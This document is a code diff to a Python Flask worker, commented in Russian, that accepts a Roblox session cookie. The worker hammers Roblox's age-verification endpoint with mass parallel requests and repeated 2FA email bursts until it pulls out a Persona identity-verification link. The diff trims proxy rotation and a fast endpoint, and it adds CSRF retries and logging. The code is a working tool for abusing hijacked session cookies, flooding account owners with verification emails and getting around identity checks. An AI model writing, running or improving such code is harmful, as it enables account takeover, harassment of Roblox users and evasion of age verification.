@@ -1,4 +1,8 @@
 # -*- coding: utf-8 -*-
+"""
+2FA Worker — бэкенд для Railway.
+Исправлена ошибка нулевых запросов, добавлено логирование и 5-минутный цикл.
+"""
 import os
 import re
 import json
@@ -10,7 +14,6 @@ import threading as _threading
 import concurrent.futures as _futures
 import requests as _requests
 from flask import Flask, request, jsonify
-from playwright.sync_api import sync_playwright
 
 logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
 
@@ -30,8 +33,6 @@ PAUSE_BURST        = float(os.environ.get("PAUSE_BURST", 0.25))
 PAUSE_POLL         = float(os.environ.get("PAUSE_POLL", 0.8))
 PAUSE_429          = float(os.environ.get("PAUSE_429", 1.2))
 RESEND_WAVE_SEC    = int(os.environ.get("RESEND_WAVE_SEC", 45))
-MAX_ERRORS         = 3
-ROTATE_PROXY_EVERY = 25
 MAX_TOTAL_REQUESTS = 150000
 
 _URL_VERIFY = "https://apis.roblox.com/age-verification-service/v1/persona-id-verification/start-verification"
@@ -72,48 +73,6 @@ def _base_headers(csrf: str | None = None) -> dict:
         h["x-csrf-token"] = csrf
     return h
 
-def extract_link_from_api(data):
-    if not isinstance(data, dict):
-        return None
-    for key in ["verificationUrl", "redirectUrl", "url", "link",
-                "personaUrl", "inquiryUrl", "sessionUrl", "verifyUrl",
-                "inquiryLink", "personaLink"]:
-        val = data.get(key, "")
-        if val and isinstance(val, str) and val.startswith("http"):
-            if "withpersona.com" in val or "persona.com" in val:
-                return val
-    inq_id = (data.get("inquiryId") or data.get("inquiry_id") or data.get("inqId"))
-    session_token = (data.get("sessionToken") or data.get("session_token") or "")
-    if inq_id and str(inq_id).startswith("inq_"):
-        link = f"https://inquiry.withpersona.com/verify?inquiry-id={inq_id}"
-        if session_token:
-            link += f"&session-token={session_token}"
-        return link
-
-    def find_deep(obj):
-        if isinstance(obj, str):
-            if ("withpersona.com" in obj or "persona.com" in obj) and obj.startswith("http"):
-                return obj
-            return None
-        if isinstance(obj, dict):
-            for k, v in obj.items():
-                if isinstance(v, str) and v.startswith("http") and ("withpersona.com" in v or "persona.com" in v):
-                    return v
-                if isinstance(v, str) and v.startswith("inq_") and len(v) > 10:
-                    tok = obj.get("sessionToken") or obj.get("session_token") or ""
-                    return f"https://inquiry.withpersona.com/verify?inquiry-id={v}" + (f"&session-token={tok}" if tok else "")
-            for v in obj.values():
-                r = find_deep(v)
-                if r:
-                    return r
-        elif isinstance(obj, list):
-            for item in obj:
-                r = find_deep(item)
-                if r:
-                    return r
-        return None
-    return find_deep(data)
-
 def extract_link_from_raw(body: str):
     if not body:
         return None
@@ -129,34 +88,6 @@ def extract_link_from_raw(body: str):
             link += f"&session-token={tok_m.group(1)}"
         return link
     return None
-
-def run_fast_api(cookie: str, method: str) -> str | None:
-    try:
-        proxy = _next_proxy()
-        proxies = _proxy_dict(proxy)
-        s = _requests.Session()
-        s.cookies[".ROBLOSECURITY"] = cookie
-        if proxies:
-            s.proxies.update(proxies)
-        s.headers.update(_base_headers())
-
-        r1 = s.post(_URL_VERIFY, json=_BODY_VERIFY, timeout=12)
-        csrf = r1.headers.get("x-csrf-token")
-        if r1.status_code == 200:
-            link = extract_link_from_api(r1.json()) or extract_link_from_raw(r1.text)
-            if link:
-                return link
-        if not csrf:
-            return None
-
-        s.headers["x-csrf-token"] = csrf
-        r2 = s.post(_URL_VERIFY, json=_BODY_VERIFY, timeout=12)
-        if r2.status_code == 200:
-            return extract_link_from_api(r2.json()) or extract_link_from_raw(r2.text)
-        return None
-    except Exception as e:
-        logging.error("Fast API error: %s", e)
-        return None
 
 def _get_user_id_and_csrf(cookie: str) -> tuple[int | None, str | None]:
     try:
@@ -174,11 +105,11 @@ def _get_user_id_and_csrf(cookie: str) -> tuple[int | None, str | None]:
             uid = r_user.json().get("id")
 
         r_csrf = s.post(_URL_VERIFY, json=_BODY_VERIFY, timeout=10)
+        csrf = r_csrf.headers.get("x-csrf-token")
         if r_csrf.status_code == 200:
-            link = extract_link_from_api(r_csrf.json()) or extract_link_from_raw(r_csrf.text)
+            link = extract_link_from_raw(r_csrf.text)
             if link:
                 return uid, "__LINK__:" + link
-        csrf = r_csrf.headers.get("x-csrf-token")
         return uid, csrf
     except Exception as e:
         logging.error("_get_user_id_and_csrf error: %s", e)
@@ -228,7 +159,7 @@ def _one_request(cookie: str, csrf: str, user_id: int | None, trigger_email: boo
 
         link = None
         if r.status_code == 200:
-            link = extract_link_from_api(r.json()) or extract_link_from_raw(r.text)
+            link = extract_link_from_raw(r.text)
 
         ctype = r.headers.get("rblx-challenge-type", "")
         cid   = r.headers.get("rblx-challenge-id", "")
@@ -255,23 +186,25 @@ def run_parallel_api_for_duration(cookie: str, workers: int = BATCH_SIZE, target
     if csrf and csrf.startswith("__LINK__:"):
         return csrf[9:]
 
+    if not csrf:
+        for _ in range(3):
+            time.sleep(0.5)
+            user_id, csrf = _get_user_id_and_csrf(cookie)
+            if csrf:
+                break
+
+    if not csrf:
+        logging.error("КРИТИЧЕСКАЯ ОШИБКА: Не удалось получить CSRF токен для запуска 2FA потоков!")
+        return None
+
+    logging.info(f"Воркер запущен: user_id={user_id}, target_emails={target_emails}, deadline={duration_sec}s")
+
     with _futures.ThreadPoolExecutor(max_workers=workers) as ex:
         while total < MAX_TOTAL_REQUESTS and (time.time() - start) < duration_sec:
             now = time.time()
             if challenges_in_wave >= target_emails and (now - last_wave_reset) >= RESEND_WAVE_SEC:
                 challenges_in_wave = 0
                 last_wave_reset = now
-
-            if not csrf:
-                uid_new, res = _get_user_id_and_csrf(cookie)
-                if uid_new:
-                    user_id = uid_new
-                if not res:
-                    time.sleep(0.4)
-                    continue
-                if res.startswith("__LINK__:"):
-                    return res[9:]
-                csrf = res
 
             need_more_emails = challenges_in_wave < target_emails
             futs = [ex.submit(_one_request, cookie, csrf, user_id, need_more_emails) for _ in range(workers)]
@@ -280,6 +213,7 @@ def run_parallel_api_for_duration(cookie: str, workers: int = BATCH_SIZE, target
 
             for r in results:
                 if r.get("link"):
+                    logging.info(f"УСПЕХ! Ссылка получена: {r['link']}")
                     return r["link"]
                 if r.get("status") == 403 and r.get("challengeType"):
                     challenges_in_wave += 1
@@ -316,25 +250,11 @@ def get_link():
     method = data.get("method", "camera").strip()
     if not cookie:
         return jsonify({"error": "cookie required"}), 400
+    
     link = run_parallel_api_for_duration(cookie, workers=BATCH_SIZE, target_emails=EMAIL_BURST_TARGET, duration_sec=DEADLINE)
     if link:
         return jsonify({"link": link})
     return jsonify({"error": "failed to get link within 5 minutes"}), 500
-
-@app.route("/get-link-fast", methods=["POST"])
-def get_link_fast():
-    secret = request.headers.get("X-Secret") or (request.json or {}).get("secret", "")
-    if secret != WORKER_SECRET:
-        return jsonify({"error": "unauthorized"}), 401
-    data = request.json or {}
-    cookie = data.get("cookie", "").strip()
-    method = data.get("method", "camera").strip()
-    if not cookie:
-        return jsonify({"error": "cookie required"}), 400
-    link = run_fast_api(cookie, method)
-    if link:
-        return jsonify({"link": link})
-    return jsonify({"error": "failed to get link"}), 500
 
 if __name__ == "__main__":
     port = int(os.environ.get("PORT", 8080))
